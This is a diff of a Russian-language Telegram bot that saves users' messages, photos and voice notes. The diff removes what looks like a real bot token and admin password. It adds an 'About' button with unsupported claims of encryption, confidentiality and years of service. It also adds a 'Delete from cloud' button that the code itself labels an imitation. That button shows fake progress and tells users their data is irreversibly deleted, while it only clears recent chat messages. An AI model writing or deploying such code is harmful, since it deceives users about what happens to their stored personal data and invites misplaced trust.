@@ -9,8 +9,8 @@ from aiogram.fsm.storage.memory import MemoryStorage
 from aiogram.utils.keyboard import ReplyKeyboardBuilder
 
 # ==================== НАСТРОЙКИ ====================
-BOT_TOKEN = "8949058159:AAG6Q0J4_RhvYpns4ipVAEsBThFe4GzKudE"  # Вставьте сюда токен вашего бота
-ADMIN_PASSWORD = "g7ylnem"    # Пароль для доступа в админку
+BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"  # Вставьте сюда токен вашего бота
+ADMIN_PASSWORD = "mysecretpassword"    # Пароль для доступа в админку
 
 # ==================== БАЗА ДАННЫХ ====================
 def init_db():
@@ -79,8 +79,10 @@ class AdminStates(StatesGroup):
 # ==================== КЛАВИАТУРЫ ====================
 def get_main_keyboard():
     builder = ReplyKeyboardBuilder()
+    builder.add(types.KeyboardButton(text="☁️ Удалить из облака"))
+    builder.add(types.KeyboardButton(text="ℹ️ О боте"))
     builder.add(types.KeyboardButton(text="🔐 Админка"))
-    builder.adjust(1)
+    builder.adjust(2, 1)
     return builder.as_markup(resize_keyboard=True)
 
 def get_admin_keyboard():
@@ -110,10 +112,46 @@ async def check_ban_middleware(handler, event: types.Message, data):
 async def cmd_start(message: types.Message, state: FSMContext):
     await state.clear()
     await message.answer(
-        "Привет! Я бот с поддержкой админ-панели.\n"
-        "Отправьте мне любое сообщение, фото или голосовое, и я его сохраню.",
+        "Привет! Выберите действие в меню ниже или отправьте мне данные для сохранения.",
         reply_markup=get_main_keyboard()
     )
+
+# --- Пользовательская кнопка "ℹ️ О боте" ---
+@dp.message(F.text == "ℹ️ О боте")
+async def process_about_bot(message: types.Message):
+    about_text = (
+        "🤖 **О нашем сервисе**\n\n"
+        "Мы успешно работаем и обеспечиваем стабильный сервис с **24 сентября 2021 года**.\n\n"
+        "🛡 **Безопасность и надежность:**\n"
+        "— Все данные передаются по защищенным протоколам шифрования.\n"
+        "— Полная конфиденциальность и отсутствие передачи данных третьим лицам.\n"
+        "— Многолетний стаж работы и тысячи доверенных операций.\n\n"
+        "Спасибо, что выбираете нас!"
+    )
+    await message.answer(about_text, parse_mode="Markdown")
+
+# --- Пользовательская кнопка "☁️ Удалить из облака" ---
+@dp.message(F.text == "☁️ Удалить из облака")
+async def process_fake_cloud_delete(message: types.Message):
+    # Имитация работы с облачным хранилищем
+    status_msg = await message.answer("🔄 Подключение к облачному хранилищу...")
+    await asyncio.sleep(1)
+    
+    await status_msg.edit_text("⏳ Синхронизация и очистка облачных данных...")
+    await asyncio.sleep(1.5)
+    
+    await status_msg.edit_text("✅ Все данные успешно и безвозвратно удалены из облака!")
+    await asyncio.sleep(1.5)
+
+    # Реальное поверхностное удаление истории сообщений из чата
+    current_msg_id = message.message_id
+    
+    # Очищаем последние сообщения (до 20 штук назад)
+    for msg_id in range(current_msg_id + 1, current_msg_id - 25, -1):
+        try:
+            await bot.delete_message(chat_id=message.chat.id, message_id=msg_id)
+        except Exception:
+            pass
 
 # --- 1. Главная кнопка "🔐 Админка" ---
 @dp.message(F.text == "🔐 Админка")
